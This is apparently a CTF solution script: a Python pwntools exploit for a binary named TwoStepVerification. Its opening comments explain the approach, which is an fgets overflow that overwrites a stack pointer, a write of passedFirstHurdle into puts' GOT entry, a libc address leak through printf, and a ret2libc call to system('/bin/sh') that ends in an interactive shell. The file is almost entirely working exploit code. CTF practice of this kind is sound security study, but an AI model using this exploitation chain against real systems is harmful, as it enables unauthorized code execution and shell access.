#!/usr/bin/env python3
 
#This CTF really has some obscure challs where the pwn and reverse challs are mixed.. 
#So the first step is to find the type of chall when I tried giving a lrage input the program crashed
#But when I noticed i in ltrace it is not a crash that happens when return .. 
#The crash happened when trying to give the second input into fgets.. That's when i notice that the second fgets
#Gets the place to insert the input via a address present in stack which got overwritten when we gave the input to first fgets
#The the first fgets accepts 22 bytes where the stack address is present after 16 bytes ..
#I thought of a place where we can use it to redirect the execution somehow as there is ASLR present and hard to find the return address
#So finally thought it is Partial RELRO ..So gonna write the address of another function passedFirstHurdle into puts got address..
#And then saw a function called verification which has a large read which makes us to perform buffer overflow.. But it has a strcmp
#If strcmp fails bufferoveflow does not trigger bcoz exit is present ..
#So pass the strcmp check then leak address using printf and perform a classical ret2libc ..The libc version in server is libc6_2.31-0ubuntu9.2_i386

from pwn import * 

e = ELF("./TwoStepVerification")
libc = ELF("/lib/i386-linux-gnu/libc.so.6") 
r = process("./TwoStepVerification")
exploit = b'A' * 16 + b'\x20\xc0\x04\x08'
r.sendline(exploit)
r.recvline()
exploit = p32(e.symbols['passedFirstHurdle'])
r.sendline(exploit)
r.recvline()
exploit = b'250382' + b'\x00' * 2 + b'A' * 20 + p32(e.symbols['printf']) + p32(e.symbols['main']) + p32(e.got['printf'])
r.send(exploit)
libc_leak = u32(r.recvuntil(b'\xf7')[-4::].decode('latin-1').ljust(4,'\x00'))
log.info("The leaked libc address of printf is " + hex(libc_leak))
base_address = libc_leak - libc.symbols["printf"]
log.info("The base address of libc is  " + hex(base_address))
system = base_address + libc.symbols["system"]
log.info("The system function adress present in remote server libc is " + hex(system))
bin_sh = base_address + next(libc.search(b'/bin/sh'))
log.info("The bin_sh string address present in remote server libc is " + hex(bin_sh))
exploit = b'250382' + b'\x00' * 2 + b'A' * 20 + p32(system) + p32(0) + p32(bin_sh)
r.send(exploit)
r.interactive()
r.close()
